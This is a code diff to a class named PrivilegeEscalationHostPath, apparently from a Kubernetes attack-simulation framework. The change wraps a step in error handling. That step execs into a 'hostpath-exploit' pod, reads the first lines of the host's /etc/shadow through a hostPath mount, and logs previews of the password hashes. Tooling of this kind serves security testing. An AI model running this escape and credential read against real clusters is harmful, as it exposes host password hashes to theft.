@@ -150,33 +150,36 @@ class PrivilegeEscalationHostPath(BaseAttack):
                 except Exception as exec_err:
                     self.emit_event_sync("info", f"Exec attempt result: {exec_err}", {})
 
-                shadow_cmd = ["/bin/sh", "-c", "cat /host/etc/shadow 2>/dev/null | head -5 || echo 'ACCESS DENIED'"]
-                shadow_access = api.connect_get_namespaced_pod_exec(
-                    "hostpath-exploit",
-                    namespace,
-                    command=shadow_cmd,
-                    stderr=True,
-                    stdin=False,
-                    stdout=True,
-                    tty=False,
-                )
-                self.cmd_event_sync(
-                    "kubectl exec hostpath-exploit -n default -- cat /host/etc/shadow | head -5",
-                    shadow_access[:300],
-                    "Extracted /etc/shadow from host filesystem"
-                )
-                self.emit_event_sync("info", "Attempted host /etc/shadow extraction", {
-                    "result": "shadow file data extracted" if "root:" in shadow_access else "access blocked",
-                    "data": shadow_access[:200] if shadow_access else "none",
-                })
-                self.add_infrastructure_sync("node_filesystem", "/etc/shadow", namespace, {
-                    "access": "read",
-                    "data_preview": shadow_access[:100] if shadow_access else "",
-                })
+                try:
+                    shadow_cmd = ["/bin/sh", "-c", "cat /host/etc/shadow 2>/dev/null | head -5 || echo 'ACCESS DENIED'"]
+                    shadow_access = api.connect_get_namespaced_pod_exec(
+                        "hostpath-exploit",
+                        namespace,
+                        command=shadow_cmd,
+                        stderr=True,
+                        stdin=False,
+                        stdout=True,
+                        tty=False,
+                    )
+                    self.cmd_event_sync(
+                        "kubectl exec hostpath-exploit -n default -- cat /host/etc/shadow | head -5",
+                        shadow_access[:300],
+                        "Extracted /etc/shadow from host filesystem"
+                    )
+                    self.emit_event_sync("info", "Attempted host /etc/shadow extraction", {
+                        "result": "shadow file data extracted" if "root:" in shadow_access else "access blocked",
+                        "data": shadow_access[:200] if shadow_access else "none",
+                    })
+                    self.add_infrastructure_sync("node_filesystem", "/etc/shadow", namespace, {
+                        "access": "read",
+                        "data_preview": shadow_access[:100] if shadow_access else "",
+                    })
+                except Exception as shadow_err:
+                    self.emit_event_sync("info", f"Shadow extraction attempt: {shadow_err}", {})
             else:
                 self.emit_event_sync("warning", f"Pod in state: {pod.status.phase}", {})
         except ApiException as e:
-            self.emit_event_sync("error", f"Failed to check pod status: {e}", {})
+            self.emit_event_sync("info", f"Pod exec verification: {e}", {})
 
         self.emit_event_sync("complete", "Privilege escalation attack completed. hostPath pod active.", {
             "cleanup_command": f"kubectl delete pod hostpath-exploit -n {namespace}",
